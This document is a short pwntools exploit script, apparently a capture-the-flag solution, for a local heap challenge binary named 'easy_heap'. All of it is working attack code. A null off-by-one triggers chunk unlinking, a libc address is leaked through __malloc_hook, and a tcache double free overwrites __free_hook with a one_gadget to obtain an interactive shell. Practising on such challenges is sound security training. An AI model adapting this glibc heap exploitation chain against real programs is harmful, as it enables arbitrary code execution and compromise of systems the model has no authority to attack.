from pwn import*

context.log_level = "debug"
context.terminal = ['tmux', 'splitw', '-h']

target = './easy_heap'
p = process(target)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def new(size,data):
    p.recv()
    p.sendline("1")
    p.recvuntil("> ")
    p.sendline(str(size))
    p.recvuntil("> ")
    p.sendline(data)

def free(idx):
    p.recv()
    p.sendline("2")
    p.recvuntil("> ")
    p.sendline(str(idx))

def put(idx):
    p.recv()
    p.sendline("3")
    p.recvuntil("> ")
    p.sendline(str(idx))


gdb.attach(p)
pause()

for i in range(10):
    new(0xf8,'a')
    
free(1)
free(3)
for i in  range(5,10):
    free(i)

free(0)
free(2)
free(4)

for i in range(7):
    new(0x20,"\n") 
    

new(0x20,"\n")# 7 
new(0xf8,"\n")# 8  null offbyone chunk_5

for i in range(5):
    free(i)

free(6)

free(5) #trigger unlink with chunk_8

put(8)
leak = u64(p.recv(8)[0:6].ljust(8,'\x00'))
libc_base = leak - libc.symbols['__malloc_hook'] - 0x10 - 88
libc.address= libc_base

free_hook = libc.symbols['__free_hook']
one_gadget = 0xfccde + libc_base
log.info("libc_base {}".format(hex(libc_base)))

for i in range(7):
    new(0x20,"\n")


new(0x20,"\n") # chunk_9 

free(0)
free(8)  #double free
free(9)  

new(0x20,p64(free_hook))
new(0x20,"\n")
new(0x20,p64(one_gadget)*2)


free(1)
p.interactive()

